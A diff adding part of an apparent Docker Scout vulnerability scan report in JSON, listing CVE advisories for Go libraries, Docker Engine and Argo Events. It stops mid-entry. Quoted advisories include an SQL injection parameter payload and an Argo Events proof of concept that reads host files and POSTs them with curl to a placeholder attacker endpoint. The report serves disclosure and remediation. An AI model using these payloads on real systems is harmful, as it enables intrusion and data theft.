+                "markdown": "> The ParseAddressList function incorrectly handles comments (text within parentheses) within display names. Since this is a misalignment with conforming address parsers, it can result in different trust decisions being made by programs using different parsers.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.8                  |\n| Fixed version  | 1.21.8                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.21.8",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.21.8",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-24791",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-24791"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-24791?s=golang&n=stdlib&t=golang&vr=%3C1.21.12",
+              "help": {
+                "text": "The net/http HTTP/1.1 client mishandled the case where a server responds to a request with an \"Expect: 100-continue\" header with a non-informational (200 or higher) status. This mishandling could leave a client connection in an invalid state, where the next request sent on the connection will fail.\n\nAn attacker sending a request to a net/http/httputil.ReverseProxy proxy can exploit this mishandling to cause a denial of service by sending \"Expect: 100-continue\" requests which elicit a non-informational response from the backend. Each such request leaves the proxy with an invalid connection, and causes one subsequent request using that connection to fail.\n",
+                "markdown": "> The net/http HTTP/1.1 client mishandled the case where a server responds to a request with an \"Expect: 100-continue\" header with a non-informational (200 or higher) status. This mishandling could leave a client connection in an invalid state, where the next request sent on the connection will fail.\n\nAn attacker sending a request to a net/http/httputil.ReverseProxy proxy can exploit this mishandling to cause a denial of service by sending \"Expect: 100-continue\" requests which elicit a non-informational response from the backend. Each such request leaves the proxy with an invalid connection, and causes one subsequent request using that connection to fail.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.12                 |\n| Fixed version  | 1.21.12                  |\n"
+              },
+              "properties": {
+                "affected_version": "<1.21.12",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.21.12",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-34156",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-34156"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-34156?s=golang&n=stdlib&t=golang&vr=%3C1.22.7",
+              "help": {
+                "text": "Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.\n",
+                "markdown": "> Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.22.7                  |\n| Fixed version  | 1.22.7                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.22.7",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.22.7",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-34158",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-34158"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-34158?s=golang&n=stdlib&t=golang&vr=%3C1.22.7",
+              "help": {
+                "text": "Calling Parse on a \"// +build\" build tag line with deeply nested expressions can cause a panic due to stack exhaustion.\n",
+                "markdown": "> Calling Parse on a \"// +build\" build tag line with deeply nested expressions can cause a panic due to stack exhaustion.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.22.7                  |\n| Fixed version  | 1.22.7                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.22.7",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.22.7",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-22868",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-22868: Improper Validation of Syntactic Correctness of Input"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-22868?s=github&n=oauth2&ns=golang.org%2Fx&t=golang&vr=%3C0.27.0",
+              "help": {
+                "text": "An attacker can pass a malicious malformed token which causes unexpected memory to be consumed during parsing.\n",
+                "markdown": "> An attacker can pass a malicious malformed token which causes unexpected memory to be consumed during parsing.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:golang/golang.org/x/oauth2@0.13.0        |\n| Affected range | <0.27.0                                      |\n| Fixed version  | 0.27.0                                       |\n| CVSS Score     |                                          7.5 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |\n"
+              },
+              "properties": {
+                "affected_version": "<0.27.0",
+                "cvssV3": 7.5,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "fixed_version": "0.27.0",
+                "purls": [
+                  "pkg:golang/golang.org/x/oauth2@0.13.0"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-22869",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-22869"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-22869?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.35.0",
+              "help": {
+                "text": "SSH servers which implement file transfer protocols are vulnerable to a denial of service attack from clients which complete the key exchange slowly, or not at all, causing pending content to be read into memory, but never transmitted.\n",
+                "markdown": "> SSH servers which implement file transfer protocols are vulnerable to a denial of service attack from clients which complete the key exchange slowly, or not at all, causing pending content to be read into memory, but never transmitted.\n\n|                |                                       |\n|----------------|---------------------------------------|\n| Package        | pkg:golang/golang.org/x/crypto@0.14.0 |\n| Affected range | <0.35.0                               |\n| Fixed version  | 0.35.0                                |\n"
+              },
+              "properties": {
+                "affected_version": "<0.35.0",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "0.35.0",
+                "purls": [
+                  "pkg:golang/golang.org/x/crypto@0.14.0"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-27304",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-27304"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-27304?s=golang&n=v2&ns=github.com%2Fjackc%2Fpgproto3&t=golang&vr=%3C2.3.3",
+              "help": {
+                "text": "An integer overflow in the calculated message size of a query or bind message could allow a single large message to be sent as multiple messages under the attacker's control. This could lead to SQL injection if an attacker can cause a single query or bind message to exceed 4 GB in size.\n",
+                "markdown": "> An integer overflow in the calculated message size of a query or bind message could allow a single large message to be sent as multiple messages under the attacker's control. This could lead to SQL injection if an attacker can cause a single query or bind message to exceed 4 GB in size.\n\n|                |                                               |\n|----------------|-----------------------------------------------|\n| Package        | pkg:golang/github.com/jackc/pgproto3@2.3.2#v2 |\n| Affected range | <2.3.3                                        |\n| Fixed version  | 2.3.3                                         |\n"
+              },
+              "properties": {
+                "affected_version": "<4.18.2",
+                "cvssV3": 8.1,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U",
+                "fixed_version": "4.18.2",
+                "purls": [
+                  "pkg:golang/github.com/jackc/pgproto3@2.3.2#v2",
+                  "pkg:golang/github.com/jackc/pgx@4.18.1#v4"
+                ],
+                "security-severity": "8.1",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-7jwh-3vrq-q3m8",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "GHSA-7jwh-3vrq-q3m8: OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities"
+              },
+              "helpUri": "https://scout.docker.com/v/GHSA-7jwh-3vrq-q3m8?s=gitlab&n=v4&ns=github.com%2Fjackc%2Fpgx&t=golang&vr=%3C4.18.2",
+              "help": {
+                "text": "SQL injection can occur if an attacker can cause a single query or bind message to exceed 4 GB in size. An integer overflow in the calculated message size can cause the one large message to be sent as multiple messages under the attacker's control.\n",
+                "markdown": "> SQL injection can occur if an attacker can cause a single query or bind message to exceed 4 GB in size. An integer overflow in the calculated message size can cause the one large message to be sent as multiple messages under the attacker's control.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:golang/github.com/jackc/pgx@4.18.1#v4    |\n| Affected range | <4.18.2                                      |\n| Fixed version  | 4.18.2                                       |\n| CVSS Score     |                                          9.8 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |\n"
+              },
+              "properties": {
+                "affected_version": "<2.3.3",
+                "cvssV3": 8.1,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U",
+                "fixed_version": "2.3.3",
+                "purls": [
+                  "pkg:golang/github.com/jackc/pgproto3@2.3.2#v2",
+                  "pkg:golang/github.com/jackc/pgx@4.18.1#v4"
+                ],
+                "security-severity": "8.1",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-27289",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-27289: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-27289?s=github&n=v4&ns=github.com%2Fjackc%2Fpgx&t=golang&vr=%3C4.18.2",
+              "help": {
+                "text": "### Impact\n\nSQL injection can occur when all of the following conditions are met:\n\n1. The non-default simple protocol is used.\n2. A placeholder for a numeric value must be immediately preceded by a minus.\n3. There must be a second placeholder for a string value after the first placeholder; both\nmust be on the same line.\n4. Both parameter values must be user-controlled.\n\ne.g. \n\nSimple mode must be enabled:\n\n```go\n// connection string includes \"prefer_simple_protocol=true\"\n// or\n// directly enabled in code\nconfig.ConnConfig.PreferSimpleProtocol = true\n```\n\nParameterized query:\n\n```sql\nSELECT * FROM example WHERE result=-$1 OR name=$2;\n```\n\nParameter values:\n\n`$1` => `-42`\n`$2` => `\"foo\\n 1 AND 1=0 UNION SELECT * FROM secrets; --\"`\n\nResulting query after preparation:\n\n```sql\nSELECT * FROM example WHERE result=--42 OR name= 'foo\n1 AND 1=0 UNION SELECT * FROM secrets; --';\n```\n\n### Patches\n\nThe problem is resolved in v4.18.2.\n\n### Workarounds\n\nDo not use the simple protocol or do not place a minus directly before a placeholder.\n",
+                "markdown": "> ### Impact\n\nSQL injection can occur when all of the following conditions are met:\n\n1. The non-default simple protocol is used.\n2. A placeholder for a numeric value must be immediately preceded by a minus.\n3. There must be a second placeholder for a string value after the first placeholder; both\nmust be on the same line.\n4. Both parameter values must be user-controlled.\n\ne.g. \n\nSimple mode must be enabled:\n\n```go\n// connection string includes \"prefer_simple_protocol=true\"\n// or\n// directly enabled in code\nconfig.ConnConfig.PreferSimpleProtocol = true\n```\n\nParameterized query:\n\n```sql\nSELECT * FROM example WHERE result=-$1 OR name=$2;\n```\n\nParameter values:\n\n`$1` => `-42`\n`$2` => `\"foo\\n 1 AND 1=0 UNION SELECT * FROM secrets; --\"`\n\nResulting query after preparation:\n\n```sql\nSELECT * FROM example WHERE result=--42 OR name= 'foo\n1 AND 1=0 UNION SELECT * FROM secrets; --';\n```\n\n### Patches\n\nThe problem is resolved in v4.18.2.\n\n### Workarounds\n\nDo not use the simple protocol or do not place a minus directly before a placeholder.\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:golang/github.com/jackc/pgx@4.18.1#v4                       |\n| Affected range | <4.18.2                                                         |\n| Fixed version  | 4.18.2                                                          |\n| CVSS Score     |                                                             8.7 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N |\n"
+              },
+              "properties": {
+                "affected_version": "<4.18.2",
+                "cvssV3": 8.7,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                "fixed_version": "4.18.2",
+                "purls": [
+                  "pkg:golang/github.com/jackc/pgx@4.18.1#v4"
+                ],
+                "security-severity": "8.7",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-30204",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-30204: Asymmetric Resource Consumption (Amplification)"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-30204?s=github&n=v4&ns=github.com%2Fgolang-jwt%2Fjwt&t=golang&vr=%3C4.5.2",
+              "help": {
+                "text": "### Summary\n\nFunction [`parse.ParseUnverified`](https://github.com/golang-jwt/jwt/blob/c035977d9e11c351f4c05dfeae193923cbab49ee/parser.go#L138-L139) currently splits (via a call to [strings.Split](https://pkg.go.dev/strings#Split)) its argument (which is untrusted data) on periods.\n\nAs a result, in the face of a malicious request whose _Authorization_ header consists of `Bearer ` followed by many period characters, a call to that function incurs allocations to the tune of O(n) bytes (where n stands for the length of the function's argument), with a constant factor of about 16. Relevant weakness: [CWE-405: Asymmetric Resource Consumption (Amplification)](https://cwe.mitre.org/data/definitions/405.html)\n\n### Details\n\nSee [`parse.ParseUnverified`](https://github.com/golang-jwt/jwt/blob/c035977d9e11c351f4c05dfeae193923cbab49ee/parser.go#L138-L139) \n\n### Impact\n\nExcessive memory allocation\n",
+                "markdown": "> ### Summary\n\nFunction [`parse.ParseUnverified`](https://github.com/golang-jwt/jwt/blob/c035977d9e11c351f4c05dfeae193923cbab49ee/parser.go#L138-L139) currently splits (via a call to [strings.Split](https://pkg.go.dev/strings#Split)) its argument (which is untrusted data) on periods.\n\nAs a result, in the face of a malicious request whose _Authorization_ header consists of `Bearer ` followed by many period characters, a call to that function incurs allocations to the tune of O(n) bytes (where n stands for the length of the function's argument), with a constant factor of about 16. Relevant weakness: [CWE-405: Asymmetric Resource Consumption (Amplification)](https://cwe.mitre.org/data/definitions/405.html)\n\n### Details\n\nSee [`parse.ParseUnverified`](https://github.com/golang-jwt/jwt/blob/c035977d9e11c351f4c05dfeae193923cbab49ee/parser.go#L138-L139) \n\n### Impact\n\nExcessive memory allocation\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:golang/github.com/golang-jwt/jwt@4.5.0#v4                   |\n| Affected range | <4.5.2                                                          |\n| Fixed version  | 4.5.2                                                           |\n| CVSS Score     |                                                             8.7 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N |\n"
+              },
+              "properties": {
+                "affected_version": "<4.5.2",
+                "cvssV3": 8.7,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                "fixed_version": "4.5.2",
+                "purls": [
+                  "pkg:golang/github.com/golang-jwt/jwt@4.5.0#v4"
+                ],
+                "security-severity": "8.7",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-45337",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-45337: Improper Authorization"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-45337?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.31.0",
+              "help": {
+                "text": "Applications and libraries which misuse the ServerConfig.PublicKeyCallback callback may be susceptible to an authorization bypass.\n\nThe documentation for ServerConfig.PublicKeyCallback says that \"A call to this function does not guarantee that the key offered is in fact used to authenticate.\" Specifically, the SSH protocol allows clients to inquire about whether a public key is acceptable before proving control of the corresponding private key. PublicKeyCallback may be called with multiple keys, and the order in which the keys were provided cannot be used to infer which key the client successfully authenticated with, if any. Some applications, which store the key(s) passed to PublicKeyCallback (or derived information) and make security relevant determinations based on it once the connection is established, may make incorrect assumptions.\n\nFor example, an attacker may send public keys A and B, and then authenticate with A. PublicKeyCallback would be called only twice, first with A and then with B. A vulnerable application may then make authorization decisions based on key B for which the attacker does not actually control the private key.\n\nSince this API is widely misused, as a partial mitigation golang.org/x/crypto@v0.31.0 enforces the property that, when successfully authenticating via public key, the last key passed to ServerConfig.PublicKeyCallback will be the key used to authenticate the connection. PublicKeyCallback will now be called multiple times with the same key, if necessary. Note that the client may still not control the last key passed to PublicKeyCallback if the connection is then authenticated with a different method, such as PasswordCallback, KeyboardInteractiveCallback, or NoClientAuth.\n\nUsers should be using the Extensions field of the Permissions return value from the various authentication callbacks to record data associated with the authentication attempt instead of referencing external state. Once the connection is established the state corresponding to the successful authentication attempt can be retrieved via the ServerConn.Permissions field. Note that some third-party libraries misuse the Permissions type by sharing it across authentication attempts; users of third-party libraries should refer to the relevant projects for guidance.\n",
+                "markdown": "> Applications and libraries which misuse the ServerConfig.PublicKeyCallback callback may be susceptible to an authorization bypass.\n\nThe documentation for ServerConfig.PublicKeyCallback says that \"A call to this function does not guarantee that the key offered is in fact used to authenticate.\" Specifically, the SSH protocol allows clients to inquire about whether a public key is acceptable before proving control of the corresponding private key. PublicKeyCallback may be called with multiple keys, and the order in which the keys were provided cannot be used to infer which key the client successfully authenticated with, if any. Some applications, which store the key(s) passed to PublicKeyCallback (or derived information) and make security relevant determinations based on it once the connection is established, may make incorrect assumptions.\n\nFor example, an attacker may send public keys A and B, and then authenticate with A. PublicKeyCallback would be called only twice, first with A and then with B. A vulnerable application may then make authorization decisions based on key B for which the attacker does not actually control the private key.\n\nSince this API is widely misused, as a partial mitigation golang.org/x/crypto@v0.31.0 enforces the property that, when successfully authenticating via public key, the last key passed to ServerConfig.PublicKeyCallback will be the key used to authenticate the connection. PublicKeyCallback will now be called multiple times with the same key, if necessary. Note that the client may still not control the last key passed to PublicKeyCallback if the connection is then authenticated with a different method, such as PasswordCallback, KeyboardInteractiveCallback, or NoClientAuth.\n\nUsers should be using the Extensions field of the Permissions return value from the various authentication callbacks to record data associated with the authentication attempt instead of referencing external state. Once the connection is established the state corresponding to the successful authentication attempt can be retrieved via the ServerConn.Permissions field. Note that some third-party libraries misuse the Permissions type by sharing it across authentication attempts; users of third-party libraries should refer to the relevant projects for guidance.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:golang/golang.org/x/crypto@0.14.0        |\n| Affected range | <0.31.0                                      |\n| Fixed version  | 0.31.0                                       |\n| CVSS Score     |                                          9.1 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |\n"
+              },
+              "properties": {
+                "affected_version": "<0.31.0",
+                "cvssV3": 9.1,
+                "cvssV3_severity": "CRITICAL",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                "fixed_version": "0.31.0",
+                "purls": [
+                  "pkg:golang/golang.org/x/crypto@0.14.0"
+                ],
+                "security-severity": "9.1",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-22871",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-22871"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-22871?s=golang&n=stdlib&t=golang&vr=%3C1.23.8",
+              "help": {
+                "text": "The net/http package improperly accepts a bare LF as a line terminator in chunked data chunk-size lines. This can permit request smuggling if a net/http server is used in conjunction with a server that incorrectly accepts a bare LF as part of a chunk-ext.\n",
+                "markdown": "> The net/http package improperly accepts a bare LF as a line terminator in chunked data chunk-size lines. This can permit request smuggling if a net/http server is used in conjunction with a server that incorrectly accepts a bare LF as part of a chunk-ext.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.23.8                  |\n| Fixed version  | 1.23.8                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.23.8",
+                "cvssV3_severity": "CRITICAL",
+                "fixed_version": "1.23.8",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "9.1",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-41110",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-41110: Partial String Comparison"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-41110?s=github&n=docker&ns=github.com%2Fdocker&t=golang&vr=%3E%3D24.0.0%2C%3C25.0.6",
+              "help": {
+                "text": "A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass [authorization plugins (AuthZ)](https://docs.docker.com/engine/extend/plugins_authorization/) under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.\n\n### Impact\n\nUsing a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an [authorization plugin](https://docs.docker.com/engine/extend/plugins_authorization/) without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.\n\n\nA security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine [v18.09.1](https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1) in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.\n\nDocker EE v19.03.x and all versions of Mirantis Container Runtime **are not vulnerable.**\n\n### Vulnerability details\n\n- **AuthZ bypass and privilege escalation:** An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.\n- **Initial fix:** The issue was fixed in Docker Engine [v18.09.1](https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1) January 2019..\n- **Regression:** The fix was not included in Docker Engine v19.03 or newer versions. This was identified in April 2024 and patches were released for the affected versions on July 23, 2024. The issue was assigned [CVE-2024-41110](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41110).\n\n### Patches\n\n- docker-ce v27.1.1 containes patches to fix the vulnerability.\n- Patches have also been merged into the master, 19.0, 20.0, 23.0, 24.0, 25.0, 26.0, and 26.1 release branches.\n\n### Remediation steps\n\n- If you are running an affected version, update to the most recent patched version.\n- Mitigation if unable to update immediately:\n    - Avoid using AuthZ plugins.\n    - Restrict access to the Docker API to trusted parties, following the principle of least privilege.\n\n\n### References\n\n- https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb\n- https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1\n- https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/\n",
+                "markdown": "> A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass [authorization plugins (AuthZ)](https://docs.docker.com/engine/extend/plugins_authorization/) under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.\n\n### Impact\n\nUsing a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an [authorization plugin](https://docs.docker.com/engine/extend/plugins_authorization/) without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.\n\n\nA security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine [v18.09.1](https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1) in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.\n\nDocker EE v19.03.x and all versions of Mirantis Container Runtime **are not vulnerable.**\n\n### Vulnerability details\n\n- **AuthZ bypass and privilege escalation:** An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.\n- **Initial fix:** The issue was fixed in Docker Engine [v18.09.1](https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1) January 2019..\n- **Regression:** The fix was not included in Docker Engine v19.03 or newer versions. This was identified in April 2024 and patches were released for the affected versions on July 23, 2024. The issue was assigned [CVE-2024-41110](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41110).\n\n### Patches\n\n- docker-ce v27.1.1 containes patches to fix the vulnerability.\n- Patches have also been merged into the master, 19.0, 20.0, 23.0, 24.0, 25.0, 26.0, and 26.1 release branches.\n\n### Remediation steps\n\n- If you are running an affected version, update to the most recent patched version.\n- Mitigation if unable to update immediately:\n    - Avoid using AuthZ plugins.\n    - Restrict access to the Docker API to trusted parties, following the principle of least privilege.\n\n\n### References\n\n- https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb\n- https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1\n- https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible       |\n| Affected range | >=24.0.0,<25.0.6                                                |\n| Fixed version  | 25.0.6                                                          |\n| CVSS Score     |                                                             9.4 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H |\n"
+              },
+              "properties": {
+                "affected_version": ">=24.0.0,<25.0.6",
+                "cvssV3": 9.4,
+                "cvssV3_severity": "CRITICAL",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+                "fixed_version": "25.0.6",
+                "purls": [
+                  "pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible"
+                ],
+                "security-severity": "9.4",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-24790",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-24790"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-24790?s=golang&n=stdlib&t=golang&vr=%3C1.21.11",
+              "help": {
+                "text": "The various Is methods (IsPrivate, IsLoopback, etc) did not work as expected for IPv4-mapped IPv6 addresses, returning false for addresses which would return true in their traditional IPv4 forms.\n",
+                "markdown": "> The various Is methods (IsPrivate, IsLoopback, etc) did not work as expected for IPv4-mapped IPv6 addresses, returning false for addresses which would return true in their traditional IPv4 forms.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.11                 |\n| Fixed version  | 1.21.11                  |\n"
+              },
+              "properties": {
+                "affected_version": "<1.21.11",
+                "cvssV3_severity": "CRITICAL",
+                "fixed_version": "1.21.11",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "9.8",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-32445",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-32445: Execution with Unnecessary Privileges"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-32445?s=github&n=argo-events&ns=github.com%2Fargoproj&t=golang&vr=%3C1.9.6",
+              "help": {
+                "text": "### Summary:\n\nA user with permission to create/modify EventSource and Sensor custom resources can gain privileged access to the host system and cluster, even without having direct administrative privileges.\n\n### Details:\n\nThe `EventSource` and `Sensor` CRs allow the corresponding orchestrated pod to be customized with `spec.template` and `spec.template.container` (with type `k8s.io/api/core/v1.Container`), thus, any specification under `container` such as `command`, `args`, `securityContext `, `volumeMount` can be specified, and applied to the EventSource or Sensor pod due to the code logic below.\n\n```golang\n    if args.EventSource.Spec.Template != nil && args.EventSource.Spec.Template.Container != nil {\n        if err := mergo.Merge(&eventSourceContainer, args.EventSource.Spec.Template.Container, mergo.WithOverride); err != nil {\n            return nil, err\n        }\n    }\n```\n\nWith these, A user would be able to gain privileged access to the cluster host, if he/she specified the EventSource/Sensor CR with some particular properties under `template`.\n\nHere is an example that demonstrates the vulnerability.\n\n```\napiVersion: argoproj.io/v1alpha1\nkind: EventSource\nmetadata:\n  name: poc-vulnerable-eventsource\nspec:\n  webhook:\n    security-test:\n      port: \"12000\"\n      endpoint: \"/webhook\"\n  template:\n    container:\n      image: ubuntu:latest\n      command: [\"/bin/bash\"]\n      args: [\n        \"-c\",\n        \"apt-get update && apt-get install -y curl && while true; do\n         rm -f /tmp/data;\n         echo '=== containerd socket ===' > /tmp/data 2>&1;\n         ls -la /host/run/containerd/containerd.sock >> /tmp/data 2>&1;\n         echo '=== proof of host access ===' >> /tmp/data 2>&1;\n         cat /host/etc/hostname >> /tmp/data 2>&1;\n         curl -X POST --data-binary @/tmp/data http://<attacker-controlled-endpoint>:8000/;\n         sleep 300;\n         done\"\n      ]\n      securityContext:\n        privileged: true\n        